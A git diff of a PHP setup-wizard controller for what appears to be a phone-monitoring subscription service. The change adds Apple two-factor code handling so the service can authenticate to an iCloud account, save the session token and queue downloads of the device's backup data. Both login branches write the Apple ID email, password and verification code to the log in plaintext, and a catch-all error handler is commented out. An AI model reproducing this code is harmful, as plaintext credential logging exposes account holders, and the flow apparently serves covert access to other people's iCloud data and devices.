@@ -21,8 +21,8 @@ use CS\Settings\GlobalSettings;
 use Models\Devices;
 use Monolog\Logger;
 
-class Wizard extends BaseController
-{
+class Wizard extends BaseController {
+
     /** @var Logger */
     protected $logger;
 
@@ -63,17 +63,17 @@ class Wizard extends BaseController
         $this->view->license = $license = $this->getLicense();
         $this->view->product = $product = $license->getProduct();
 
-        if ($product->getNamespace() == 'second' || $product->getNamespace() == 'registration-trial' || ($product->getNamespace() == 'control-admin-creation' && $product->getGroup() != 'premium' && $product->getGroup() != 'premium-double' && $product->getGroup() != 'basic' && $product->getGroup() != 'basic-double')){
+        if ($product->getNamespace() == 'second' || $product->getNamespace() == 'registration-trial' || ($product->getNamespace() == 'control-admin-creation' && $product->getGroup() != 'premium' && $product->getGroup() != 'premium-double' && $product->getGroup() != 'basic' && $product->getGroup() != 'basic-double')) {
             $this->view->iCloudAvailable = ($product->getGroup() == 'ios-icloud' || $product->getGroup() == 'ios-icloud-double' || $product->getGroup() == 'trial');
             $this->view->jailbreakAvailable = ( $product->getGroup() == 'ios-jailbreak' || $product->getGroup() == 'ios-jailbreak-double' || $product->getGroup() == 'trial');
-            $this->view->androidAvailable = ($product->getGroup() == 'android-basic' || $product->getGroup() == 'android-basic-double' || $product->getGroup() == 'android-premium'|| $product->getGroup() == 'android-premium-double' || $product->getGroup() == 'trial');
+            $this->view->androidAvailable = ($product->getGroup() == 'android-basic' || $product->getGroup() == 'android-basic-double' || $product->getGroup() == 'android-premium' || $product->getGroup() == 'android-premium-double' || $product->getGroup() == 'trial');
         } else {
             $this->view->iCloudAvailable = ($product->getGroup() == 'premium' || $product->getGroup() == 'trial' || $product->getGroup() == 'premium-double');
             $this->view->jailbreakAvailable = true;
             $this->view->androidAvailable = true;
         }
 
-         $this->view->title = $this->di->getTranslator()->_('Select a Platform');
+        $this->view->title = $this->di->getTranslator()->_('Select a Platform');
         $this->setView('wizard/platform.htm');
     }
 
@@ -84,7 +84,7 @@ class Wizard extends BaseController
         else
             $license = $this->getICloudLicense();
 
-        $this->checkPlatformAssignSubscription($this->getPlatform(),$license->getProduct()->getGroup());
+        $this->checkPlatformAssignSubscription($this->getPlatform(), $license->getProduct()->getGroup());
 
         $deviceModel = new Devices($this->di);
         $devices = $deviceModel->getUserDevices($this->auth['id'], $this->getPlatform(), false);
@@ -146,8 +146,8 @@ class Wizard extends BaseController
 
     public function registerAppAction()
     {
-        $this->checkPlatformAssignSubscription($this->getPlatform(),$this->getLicense(false)->getProduct()->getGroup());
-        
+        $this->checkPlatformAssignSubscription($this->getPlatform(), $this->getLicense(false)->getProduct()->getGroup());
+
         if (isset($_POST['code'])) {
 
             $deviceCode = new DeviceCode($this->di->get('db'));
@@ -176,6 +176,9 @@ class Wizard extends BaseController
     {
         $licenseRecord = $this->getICloudLicense();
 
+        $this->view->twoFactorAuthentication = false;
+        $this->view->invalidVerificationCode = false;
+        
         try {
             if ($_POST) {
                 if (empty($_POST['email']))
@@ -183,9 +186,22 @@ class Wizard extends BaseController
                 elseif (empty($_POST['password']))
                     throw new EmptyICloudPassword;
 
-                $this->logger->addInfo('iCloud USER #' . $this->auth['id'] . ' ACCOUNT: ' . $_POST['email'] . ' ' . $_POST['password']);
-
-                $iCloud = new iCloudBackup($_POST['email'], $_POST['password']);
+                if ($this->getRequest()->hasPost('token')) {
+                    $auth = \AppleCloud\Entry\Auth::createFromString($this->getRequest()->post('token'));
+                } elseif ($this->getRequest()->hasPost('email', 'password', 'verificationCode')) {
+                    $this->logger->addInfo('iCloud Verification Code #' . $this->auth['id'] . ' ACCOUNT: ' . $_POST['email'] . ' ' . $_POST['password'] . ' ' . $this->getRequest()->post('verificationCode'));
+                    $client = new \AppleCloud\ServiceClient\Setup($this->logger);
+                    $auth = $client->authenticate($this->getRequest()->post('email'), $this->getRequest()->post('password'), $this->getRequest()->post('verificationCode'));
+                } else {
+                    $this->logger->addInfo('iCloud USER #' . $this->auth['id'] . ' ACCOUNT: ' . $_POST['email'] . ' ' . $_POST['password']);
+                    $client = new \AppleCloud\ServiceClient\Setup($this->logger);
+                    $auth = $client->authenticate($this->getRequest()->post('email'), $this->getRequest()->post('password'));
+                }
+                
+                $token = $auth->getFullToken();
+                
+                $cloudClient = new \CS\ICloud\CloudClient($token);
+                $iCloud = new iCloudBackup($cloudClient);
 
                 $devices = $iCloud->getAllDevices();
 
@@ -195,8 +211,9 @@ class Wizard extends BaseController
                     $this->view->title = $this->di->getTranslator()->_('Connect to iCloud Account');
                     $this->setView('wizard/register.icloud.backup.not.found.htm');
                     return;
-                } else
+                } else {
                     $devices = $devModel->iCloudMergeWithLocalInfo($this->auth['id'], $devices);
+                }
 
                 if (isset($_POST['devHash']) && !empty($_POST['devHash'])) {
 
@@ -204,26 +221,30 @@ class Wizard extends BaseController
                         if ($device['SerialNumber'] === $_POST['devHash']) {
                             if ($this->getICloudLicense()->getProduct()->getGroup() == 'trial' &&
                                     $devModel->existsOnOtherUsers($this->auth['id'], $device['SerialNumber'])) {
-                                
+
                                 $storeUrl = $this->di['config']['url']['registration'];
                                 $supportUrl = $this->di->getRouter()->getRouteUrl('support');
-                                
+
                                 $this->di->getFlashMessages()->add(FlashMessages::ERROR, $this->di->getTranslator()->_('This device can not be added to free trial subscription because it is linked with another account. Please, log in to your primary account or purchase a subscription plan in the %1$sStore%2$s. If you think an error has occurred, please, contact %3$sSupport%4$s.', [
-                                    '<a href="' . $storeUrl . '">',
-                                    '</a>',
-                                    '<a href="' . $supportUrl . '">',
-                                    '</a>'
+                                            '<a href="' . $storeUrl . '">',
+                                            '</a>',
+                                            '<a href="' . $supportUrl . '">',
+                                            '</a>'
                                 ]));
-                                
+
                                 $accounts = $devModel->getUsersWithDevice($this->auth['id'], $device['SerialNumber']);
                                 $this->di['usersNotesProcessor']->deviceDuplicated($device['SerialNumber'], $accounts);
-                                                                
+
                                 $this->redirect($this->di->getRouter()->getRouteUrl(WizardRouter::STEP_REGISTER));
                             }
 
                             if ($device['added']) {
                                 if (!$device['active']) {
                                     try {
+                                        $this->getDevice($device['device_id'])
+                                                ->setToken($token)
+                                                ->save();
+                                        
                                         $deviceObserver = new DeviceObserver($this->di->get('logger'));
                                         $deviceObserver->setMainDb($this->di->get('db'))
                                                 ->setDevice($this->getDevice($device['device_id']))
@@ -238,11 +259,12 @@ class Wizard extends BaseController
 
                                                     if ($queueManager->addTaskDevice('downloadChannel', $iCloudDevice)) {
                                                         $iCloudDevice->setProcessing(1);
-                                                    } else
+                                                    } else {
                                                         $iCloudDevice->setLastError($queueManager->getError());
+                                                    }
+                                                    
                                                     $iCloudDevice->save();
                                                 });
-
                                         if ($deviceObserver->assignLicenseToDevice()) {
                                             $this->redirect($this->di->getRouter()->getRouteUrl(WizardRouter::STEP_FINISH, array('deviceId' => $deviceObserver->getDevice()->getId())));
                                         } else
@@ -262,6 +284,7 @@ class Wizard extends BaseController
                                         ->setUniqueId($device['SerialNumber'])
                                         ->setName(DeviceManager::remove4BytesCharacters($device['DeviceName']))
                                         ->setModel($device['MarketingName'])
+                                        ->setToken($token)
                                         ->setOS(DeviceRecord::OS_ICLOUD)
                                         ->setOSVersion($device['ProductVersion']);
 
@@ -292,8 +315,10 @@ class Wizard extends BaseController
                                             $queueManager = new \CS\Queue\Manager($this->di['queueClient']);
                                             if ($queueManager->addTaskDevice('downloadChannel', $deviceObserver->getICloudDevice())) {
                                                 $deviceObserver->getICloudDevice()->setProcessing(1);
-                                            } else
+                                            } else {
                                                 $deviceObserver->getICloudDevice()->setLastError($queueManager->getError());
+                                            }
+                                            
                                             $deviceObserver->getICloudDevice()->save();
                                         });
 
@@ -320,6 +345,7 @@ class Wizard extends BaseController
                 $this->view->appleID = $_POST['email'];
                 $this->view->applePassword = $_POST['password'];
                 $this->view->devices = $devices;
+                $this->view->token = $token;
                 $this->setView('wizard/register.icloud.device.htm');
                 return;
             }
@@ -329,20 +355,22 @@ class Wizard extends BaseController
         } catch (EmptyICloudPassword $e) {
             $this->di->getFlashMessages()->add(FlashMessages::ERROR, $this->di->getTranslator()->_('The filed iCloud Password is empty. Please enter the password.'));
             $this->redirect($this->di->getRouter()->getRouteUrl(WizardRouter::STEP_REGISTER));
-        } catch (TwoStepVerificationException $e) {
-            $this->di->getFlashMessages()->add(FlashMessages::ERROR, $this->di->getTranslator()->_('Two-step verification activated. Please %sturn it off%s to receive data updates.', array(
-                        '<a href="https://support.apple.com/en-us/HT202664" target="_blank" rel="nofollow">',
-                        '</a>',
-            )));
+        } catch (\AppleCloud\ServiceClient\Exception\BadVerificationCredentialsException $e) {
+            $this->view->twoFactorAuthentication = true;
+            $this->view->invalidVerificationCode = true;
+        } catch (\AppleCloud\ServiceClient\Exception\TwoStepVerificationException $e) {
+            $this->view->twoFactorAuthentication = true;
+        } catch (\AppleCloud\ServiceClient\Exception\BadCredentialsException $e) {
+            $this->di->getFlashMessages()->add(FlashMessages::ERROR, $this->di->getTranslator()->_("The password you have entered doesn’t match Apple ID. Check the entry and try again."));
             $this->redirect($this->di->getRouter()->getRouteUrl(WizardRouter::STEP_REGISTER));
         } catch (InvalidAuthException $e) {
             $this->di->getFlashMessages()->add(FlashMessages::ERROR, $this->di->getTranslator()->_('Invalid Email or Password.'));
             $this->redirect($this->di->getRouter()->getRouteUrl(WizardRouter::STEP_REGISTER));
-        } catch (\Exception $e) {
+        }/* catch (\Exception $e) {
             $this->logger->addCritical($e);
             $this->di->getFlashMessages()->add(FlashMessages::ERROR, $this->di->getTranslator()->_('Unexpected Error. Please try later or contact us!'));
             $this->redirect($this->di->getRouter()->getRouteUrl(WizardRouter::STEP_REGISTER));
-        }
+        }*/
 
         $this->view->title = $this->di->getTranslator()->_('Connect to iCloud Account');
         $this->setView('wizard/register.icloud.account.htm');
@@ -426,12 +454,12 @@ class Wizard extends BaseController
         static $platform;
         if (is_null($platform)) {
             $platform = $this->getParam('platform');
-            if (!in_array($platform, array('android', 'ios', 'icloud')) ) {
-                if ($platform != 'no'){
+            if (!in_array($platform, array('android', 'ios', 'icloud'))) {
+                if ($platform != 'no') {
                     $this->di->getFlashMessages()->add(FlashMessages::ERROR, $this->di->getTranslator()->_('Invalid Platform'));
                 }
                 $this->redirect($this->di->getRouter()->getRouteUrl(WizardRouter::STEP_PLATFORM, array(
-                    'platform' => false
+                            'platform' => false
                 )));
             }
         }
@@ -444,36 +472,38 @@ class Wizard extends BaseController
 
         try {
             if (($license->getProduct()->getGroup() !== 'ios-icloud' && $license->getProduct()->getGroup() !== 'trial' &&
-                $license->getProduct()->getGroup() !== 'ios-icloud-double' && $license->getProduct()->getGroup() !== 'premium' && $license->getProduct()->getGroup() !== 'premium-double'))
-            throw new \Exception;
+                    $license->getProduct()->getGroup() !== 'ios-icloud-double' && $license->getProduct()->getGroup() !== 'premium' && $license->getProduct()->getGroup() !== 'premium-double'))
+                throw new \Exception;
         } catch (\Exception $e) {
             $this->di->getFlashMessages()->add(FlashMessages::ERROR, $this->di->getTranslator()->_('Subscription is not available for the selected device as their types don\'t match. Use the subscription for another device or buy a subscription that matches your device type.'));
             $this->redirect($this->di->getRouter()->getRouteUrl(WizardRouter::STEP_PACKAGE));
         }
         return $license;
     }
+
     public function getIosLicense($mastBeAvailable = true)
     {
         $license = $this->getLicense($mastBeAvailable);
 
         try {
             if (($license->getProduct()->getGroup() !== 'ios-jailbreak' && $license->getProduct()->getGroup() !== 'trial' &&
-                $license->getProduct()->getGroup() !== 'ios-jailbreak-double' && $license->getProduct()->getGroup() !== 'premium' && $license->getProduct()->getGroup() !== 'premium-double' && $license->getProduct()->getGroup() !== 'basic' && $license->getProduct()->getGroup() !== 'basic-double'))
-            throw new \Exception;
+                    $license->getProduct()->getGroup() !== 'ios-jailbreak-double' && $license->getProduct()->getGroup() !== 'premium' && $license->getProduct()->getGroup() !== 'premium-double' && $license->getProduct()->getGroup() !== 'basic' && $license->getProduct()->getGroup() !== 'basic-double'))
+                throw new \Exception;
         } catch (\Exception $e) {
             $this->di->getFlashMessages()->add(FlashMessages::ERROR, $this->di->getTranslator()->_('Subscription is not available for the selected device as their types don\'t match. Use the subscription for another device or buy a subscription that matches your device type.'));
             $this->redirect($this->di->getRouter()->getRouteUrl(WizardRouter::STEP_PACKAGE));
         }
         return $license;
     }
+
     public function getAndroidLicense($mastBeAvailable = true)
     {
         $license = $this->getLicense($mastBeAvailable);
 
         try {
             if (($license->getProduct()->getGroup() !== 'android-basic' && $license->getProduct()->getGroup() !== 'android-premium' && $license->getProduct()->getGroup() !== 'trial' &&
-                $license->getProduct()->getGroup() !== 'android-basic-double' && $license->getProduct()->getGroup() !== 'android-premium-double' && $license->getProduct()->getGroup() !== 'premium' && $license->getProduct()->getGroup() !== 'premium-double' && $license->getProduct()->getGroup() !== 'basic' && $license->getProduct()->getGroup() !== 'basic-double'))
-            throw new \Exception;
+                    $license->getProduct()->getGroup() !== 'android-basic-double' && $license->getProduct()->getGroup() !== 'android-premium-double' && $license->getProduct()->getGroup() !== 'premium' && $license->getProduct()->getGroup() !== 'premium-double' && $license->getProduct()->getGroup() !== 'basic' && $license->getProduct()->getGroup() !== 'basic-double'))
+                throw new \Exception;
         } catch (\Exception $e) {
             $this->di->getFlashMessages()->add(FlashMessages::ERROR, $this->di->getTranslator()->_('Subscription is not available for the selected device as their types don\'t match. Use the subscription for another device or buy a subscription that matches your device type.'));
             $this->redirect($this->di->getRouter()->getRouteUrl(WizardRouter::STEP_PACKAGE));
@@ -516,27 +546,24 @@ class Wizard extends BaseController
 
     public function checkPlatformAssignSubscription($platform, $licenseGroup)
     {
-        if (($platform == 'icloud' && in_array($licenseGroup, array('ios-icloud', 'ios-icloud-double','premium','premium-double', 'trial'))) ||
-            ($platform == 'ios' && in_array($licenseGroup, array('ios-jailbreak', 'ios-jailbreak-double', 'basic','premium','basic-double','premium-double', 'trial'))) ||
-            ($platform == 'android' && in_array($licenseGroup, array('android-basic','android-premium','android-basic-double','android-premium-double', 'basic','premium','basic-double','premium-double', 'trial'))) ||
-            ($platform == 'no' && in_array($licenseGroup, array('basic','premium','basic-double','premium-double', 'trial')))
+        if (($platform == 'icloud' && in_array($licenseGroup, array('ios-icloud', 'ios-icloud-double', 'premium', 'premium-double', 'trial'))) ||
+                ($platform == 'ios' && in_array($licenseGroup, array('ios-jailbreak', 'ios-jailbreak-double', 'basic', 'premium', 'basic-double', 'premium-double', 'trial'))) ||
+                ($platform == 'android' && in_array($licenseGroup, array('android-basic', 'android-premium', 'android-basic-double', 'android-premium-double', 'basic', 'premium', 'basic-double', 'premium-double', 'trial'))) ||
+                ($platform == 'no' && in_array($licenseGroup, array('basic', 'premium', 'basic-double', 'premium-double', 'trial')))
         ) {
             return true;
         }
 
         $this->di->getFlashMessages()->add(FlashMessages::ERROR, $this->di->getTranslator()->_('Subscription is not available for the selected device as their types don\'t match. Use the subscription for another device or buy a subscription that matches your device type.'));
         $this->redirect($this->di->getRouter()->getRouteUrl(WizardRouter::STEP_PACKAGE));
-
     }
 
 }
 
-class EmptyICloudId extends \Exception
-{
+class EmptyICloudId extends \Exception {
     
 }
 
-class EmptyICloudPassword extends \Exception
-{
+class EmptyICloudPassword extends \Exception {
     
 }
